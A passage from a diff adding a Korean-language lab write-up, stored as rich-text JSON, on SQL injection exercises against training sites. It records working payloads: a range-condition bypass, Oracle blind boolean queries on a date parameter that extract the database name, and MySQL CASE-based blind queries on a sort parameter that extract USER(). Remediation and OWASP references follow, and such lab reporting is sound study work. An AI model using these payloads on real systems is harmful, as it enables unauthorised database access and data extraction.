+                    "text": "하한 0과 상한 9999)--를 입력했을 때 추가 ID와 연봉 정보가 표시되었다. 기존 조회의 제한 조건이 변경되었을 가능성을 확인하였다."
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "문서 제목은 “SQL JOIN”이었지만 실제 기록에는 JOIN 연산을 이용한 과정이 없다. 두 숫자 입력이 들어가는 범위 조건과 닫는 괄호, 뒤쪽 조건을 추론한 실습으로 분류했다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "text"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "입력값 1: 0\n입력값 2: 9999)--"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "아래 SQL은 응답을 설명하기 위한 구조 예시다. HR·SALARY 같은 식별자와 뒤쪽 조건은 서버에서 확인한 소스가 아니다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "sql"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "SELECT ID, SALARY\nFROM HR\nWHERE (SALARY BETWEEN <입력값 1> AND <입력값 2>)\n  AND <추가 조회 조건>"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "처음에는 비교 연산자 조건과 BETWEEN 조건을 각각 가정했다. 앞 입력 뒤에서 바로 주석 처리하거나 닫는 괄호 없이 끝냈을 때 기대한 결과가 나오지 않았다. 뒤 입력을 9999)--로 바꾼 후 기존 화면에 없던 ID가 나타나, 범위를 감싼 괄호와 뒤쪽 조건을 고려한 가설을 세웠다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "확인한 것은 조회되는 ID가 늘었다는 결과다. 전체 회원 수와 결과를 대조하지 않았으므로 “모든 회원을 탈취했다”는 결론으로 확대하지 않는다. 화면의 10자리 제한과 숫자 입력 UI도 서버 측 검증을 대신하지 않는다. HTTP 메서드와 실제 매개변수 이름은 원문에서 확정할 수 없어 추정하지 않았다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "결과와 보완점"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "정상 조회에서 보이지 않던 ID의 추가 노출을 확인하였다. 전체 회원 수와 대조한 자료가 없으므로 “모든 회원 ID 추출 완료”로 확대하지 않는다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "입력값으로 조회 범위나 접근 조건을 바꾸어 의도하지 않은 계정 정보가 노출될 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "이 실습에서 SQL JOIN을 사용했다는 근거는 없다. HTTP 파라미터명, 정상 조회 건수와 변경 후 전체 건수는 추가 확인이 필요하다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "개선 방향: 연봉 입력을 서버에서 숫자와 범위로 검증한 뒤 바인딩한다. 접근권한 조건은 클라이언트 입력으로 제거하거나 변경할 수 없도록 서버에서 별도로 적용한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "향후 재검증 기준: 정상적인 연봉 구간 검색이 유지되고, 괄호·주석을 포함한 입력으로 조회 범위나 권한 조건이 달라지지 않아야 한다. 이 기준으로 수정 후 재검증한 기록은 아직 없다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "6. 날짜 검색 조건의 SQL 인젝션"
+          }
+        ]
+      },
+      {
+        "type": "table",
+        "content": [
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "항목"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "내용"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "원본"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "2일차 · 2026-11-03"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "확인 지점"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "http://shanky.co.kr:38081/lhs/board/boardList.jsp"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "입력값"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "종료일 eDate"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "요청 방식"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "GET"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "게시판의 날짜 검색 조건에서 입력값이 SQL 조건에 영향을 주는 현상을 확인하였다. 종료일 파라미터의 응답 차이를 이용하여 DB 이름을 ORCL로 확인하였다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "확인 과정"
+          }
+        ]
+      },
+      {
+        "type": "orderedList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "검색 요청에서 check1, searchType, searchText, sDate, eDate를 확인하였다. check1 누락 시 나타난 NullPointerException은 별도의 예외 처리 문제로 구분하였다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "검색어와 날짜 입력의 응답을 비교하였다. 종료일 입력의 따옴표 및 날짜 변환 함수 종료 형태에 따라 게시물 목록의 표시 여부가 달라졌다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "날짜 변환 함수가 사용되었을 가능성을 가정하고 조건식을 비교하였다. LENGTH(SYS.DATABASE_NAME)=4 조건에서 게시물 목록이 표시되었다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "문자별 비교에서 O, R, C, L을 확인하고, 캡처에 보이는 SYS.DATABASE_NAME='ORCL' 비교로 전체 문자열을 검증하였다."
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "검색 화면의 날짜 선택 UI도 HTTP 요청에서는 사용자 입력이다. 캡처의 실제 매개변수는 check1, searchType, searchText, sDate, eDate이며, 여러 검색 항목을 선택하면 check1이 반복된다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "http"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "GET /lhs/board/boardList.jsp?check1=SUBJECT&check1=WRITER&check1=CONTENTS&searchType=ALL&searchText=TES&sDate=20260101&eDate=20261231"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "check1을 지웠을 때 발생한 NullPointerException은 필수 입력 처리의 문제를 보여 준다. 이것만으로 SQL의 정확한 분기 구조를 확인한 것은 아니다. 검색어에서는 이번 입력으로 SQLi를 입증하지 못했고, eDate에서 날짜 변환 구문의 끝을 고려했을 때 조건 비교가 가능해졌다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "sql"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "-- eDate에 넣은 값\n20261231', 'YYYY-MM-DD') AND 1=1 --\n20261231', 'YYYY-MM-DD') AND LENGTH(SYS.DATABASE_NAME)>3 --\n20261231', 'YYYY-MM-DD') AND LENGTH(SYS.DATABASE_NAME)>4 --\n20261231', 'YYYY-MM-DD') AND LENGTH(SYS.DATABASE_NAME)=4 --\n20261231', 'YYYY-MM-DD') AND ASCII(SUBSTR(SYS.DATABASE_NAME,1,1))=79 --\n20261231', 'YYYY-MM-DD') AND SYS.DATABASE_NAME='ORCL' --"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "길이는 4였고 각 문자 비교 결과는 79(O), 82(R), 67(C), 76(L)이었다. 마지막 전체 문자열 검증에는 작은따옴표가 필요하다. 원문의 설명에서는 ORCL의 따옴표가 빠졌지만 캡처에는 포함되어 있었다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "TO_DATE는 문자열을 DATE 값으로 변환하는 함수다. 화면에 숫자처럼 보이는 날짜가 입력되어도 숫자형 입력이라고 단정하지 않는다. 위 날짜 문자열과 형식은 해당 실습에서 관찰한 입력이며, 다른 환경에서 같은 변환이 된다고 가정하지 않는다. 빈 목록만으로 DB 오류 여부를 확정할 수도 없다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Oracle Database TO_DATE",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/TO_DATE.html"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "결과와 보완점"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "종료일 조건의 SQL 인젝션을 통해 DB 이름 ORCL을 확인하였다. 목록 미표시만으로 SQL 오류가 발생했다고 단정하지 않는다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "검색어 외에도 날짜와 같은 구조화된 입력이 정보 추론 경로가 될 수 있다. 예외 메시지 노출은 내부 구현 정보 노출로 이어질 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "TO_DATE는 문자열을 DATE 값으로 변환한다. 본문의 서버 SQL은 추정이며, 검증 당시 입력의 형식 마스크와 전송값은 원 요청 기준으로 보존한다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "src": "/assets/uploads/195deac9-942c-50cc-bb97-98c63f3af522/6ba18e0b-94b2-50b7-b897-753961d86693.png",
+          "assetId": "6ba18e0b-94b2-50b7-b897-753961d86693",
+          "alt": "DB 이름 ORCL 전체 비교 뒤 게시물 목록이 표시된 화면."
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "그림 4. DB 이름 ORCL 전체 비교 뒤 게시물 목록이 표시된 화면."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "개선 방향: 날짜를 서버에서 정해진 형식으로 해석하고 타입이 지정된 값으로 바인딩한다. 검색 열은 허용 목록으로 제한하고 누락 파라미터와 예외를 처리한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "향후 재검증 기준: 정상 날짜 검색, 유효하지 않은 날짜, 따옴표 입력 및 필수 파라미터 누락을 비교하여 기능 정상 동작과 오류 정보 비노출을 확인한다. 이 기준으로 수정 후 재검증한 기록은 아직 없다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "7. 정렬 파라미터의 SQL 인젝션"
+          }
+        ]
+      },
+      {
+        "type": "table",
+        "content": [
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "항목"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "내용"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "원본"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "3일차 · 2026-11-04"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "확인 지점"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "https://lab.eqst.co.kr:8083/exam8/noticelist.php"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "입력값"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "sortingAD 중심, sorting 비교"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "요청 방식"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "GET"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "공지사항 정렬 방향 파라미터에 조건식을 삽입하여 응답 차이를 확인하였다. USER() 반환값은 18자이며, 확인된 앞부분 dbms@에서 사용자명 부분 dbms를 도출하였다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "확인 과정"
+          }
+        ]
+      },
+      {
+        "type": "orderedList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "keyword, sorting, sortingAD를 확인하고 각 파라미터를 변경하였다. keyword의 비교에서는 이번 입력으로 SQL 조건 변경을 확인하지 못하였다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "sorting과 sortingAD에 작은따옴표를 넣었을 때 게시물 목록이 사라졌다. 이를 근거로 ORDER BY 관련 입력 처리를 우선 검토하였다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "sortingAD에 CASE 조건식을 넣어 정상 응답과 오류 유도 분기의 차이를 이용하였다. USER() 반환값의 길이 18에 대한 성공 응답을 확인하였다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "위치별 문자 비교에서 d, b, m, s, @를 확인하였다. 계정명 부분을 dbms로 정리하였으며, @ 뒤 호스트 전체를 추출한 근거는 없다."
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "메인 화면에서 공지사항으로 이동한 뒤 실제 GET 요청을 확인했다. 요청 처리 경로는 /exam8/noticelist.php이며 keyword, sorting, sortingAD가 들어간다. keyword의 참·거짓 입력에서는 응답 차이를 확인하지 못했으므로 취약 지점으로 확정하지 않았다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "정렬 방향 뒤에 CASE 식을 추가하는 형태를 검증했다. 참이면 상수 1, 거짓이면 여러 행을 반환하는 서브쿼리를 선택하도록 구성했다. 스칼라 값이 필요한 자리에 다중 행 결과가 오면 오류가 날 수 있다는 차이를 판정에 이용한 것이다. 앞선 오류 기반 실습처럼 오류 메시지 안에서 값을 직접 읽은 방식은 아니다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "sql"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "-- sortingAD 입력값; URL의 +는 공백으로 풀어 표기\nDESC, CASE WHEN LENGTH(USER())>0 THEN 1 ELSE (SELECT 1 UNION SELECT 2) END\nDESC, CASE WHEN LENGTH(USER())=18 THEN 1 ELSE (SELECT 1 UNION SELECT 2) END\nDESC, CASE WHEN ASCII(SUBSTR(USER(),1,1))=100 THEN 1 ELSE (SELECT 1 UNION SELECT 2) END\nDESC, CASE WHEN ASCII(SUBSTR(USER(),5,1))=64 THEN 1 ELSE (SELECT 1 UNION SELECT 2) END"
+          }
+        ]
+      },
+      {
+        "type": "table",
+        "content": [
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "항목"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "확인값"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "해석"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "USER() 전체 길이"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "18"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "호스트 부분을 포함한 반환값의 길이"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "첫 다섯 문자"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "dbms@"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "사용자명 부분은 dbms, 4자"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "@ 뒤의 값"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "미추출"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "호스트명 전체를 확인한 것은 아님"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "MySQL의 USER()는 사용자명과 호스트를 함께 반환한다. 따라서 18자를 “DB 사용자명 길이”라고 쓰면 부정확하다. 거짓 조건의 실제 DB 오류 문구와 서버 쿼리 원문은 확보되지 않았으므로, CASE와 다중 행 오류에 대한 설명은 관찰된 응답을 설명하는 구조로 구분했다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "MySQL USER function",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://dev.mysql.com/doc/refman/8.4/en/information-functions.html#function_user"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 3
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "결과와 보완점"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "정렬 방향 값이 SQL 구조에 영향을 줄 수 있음을 확인하였다. USER() 반환 문자열의 길이와 사용자명 부분의 길이를 구분하였다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "검색값 바인딩만 적용하고 정렬 열·방향을 입력값으로 직접 결합하면 SQL 구문 삽입이 남을 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "USER()는 사용자명과 호스트를 포함할 수 있다. 오류 유도 분기의 DB 오류 원문과 반대 조건 응답을 함께 보강하면 판정이 더 명확해진다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "개선 방향: 정렬 열은 서버가 정한 열 이름으로 매핑하고 방향은 ASC 또는 DESC만 허용한다. 데이터 조건에는 바인딩을 적용하고 임의의 SQL 식을 정렬 값으로 받지 않는다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "향후 재검증 기준: 허용된 정렬 옵션은 정상 동작하고, 따옴표·쉼표·조건식을 포함한 정렬 값은 거부되어야 한다. 이 기준으로 수정 후 재검증한 기록은 아직 없다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "대응 방법과 다음 검증"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "문자열·숫자·날짜 값은 바인드 변수로 전달하고, 정렬 열 이름과 ASC·DESC처럼 식별자나 구문을 결정하는 값은 서버가 정한 허용 목록으로 매핑한다. 화면에서 숫자나 날짜만 고르게 하는 방식은 직접 만든 요청을 막지 못한다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "OWASP SQL Injection Prevention",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "bulletList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "DB 계정은 업무에 필요한 테이블·기능만 접근하도록 제한한다. 상세 오류는 서버 로그에 남기고 사용자 응답에서 내부 객체와 값을 제거한다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "비밀번호는 단순 빠른 해시 대신 솔트가 적용된 전용 비밀번호 해시 방식으로 저장한다. 해시 노출 자체도 민감한 정보 노출로 다룬다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "수정 후에는 정상 입력과 참·거짓 비교 입력을 다시 대조한다. 오류 문구를 숨기는 것만으로는 Blind SQLi가 해결됐다고 볼 수 없다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "원본에 없는 서버 소스, 로그인 처리 경로, 실제 정렬·열거 기준은 추가 확인할 항목이다. 이 글에는 수정 배포나 재검증을 수행한 결과를 포함하지 않았다."
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "OWASP Password Storage",
+            "marks": [
+              {
+                "type": "link",
+                "attrs": {
+                  "href": "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html"
+                }
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "실습에서 정리한 점"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "처음에는 검색창에 작은따옴표를 넣고 오류가 나는지에 집중했다. 이후에는 정상 응답과 거짓 응답을 먼저 정의하고, 입력이 값인지 정렬 구문인지, 날짜 변환 함수 안인지에 따라 가설을 세우는 과정이 더 중요했다. 추출한 후보를 전체 문자열로 다시 확인하고, 관찰한 범위를 넘어선 결론을 쓰지 않는 방식으로 기록을 보완했다."
+          }
+        ]
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "원본 기록"
+          }
+        ]
+      },
+      {
+        "type": "table",
+        "content": [
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "절"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableHeader",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "원본 문서"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "1"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "1일차-1-Union-유영택.docx"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "2"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "1일차-2-Error-유영택.docx"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "3"
+                      }
+                    ]
+                  }
+                ]
+              },
+              {
+                "type": "tableCell",
+                "content": [
+                  {
+                    "type": "paragraph",
+                    "content": [
+                      {
+                        "type": "text",
+                        "text": "1일차-3-Blind-유영택.docx"
+                      }
+                    ]
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "tableRow",
+            "content": [
+              {
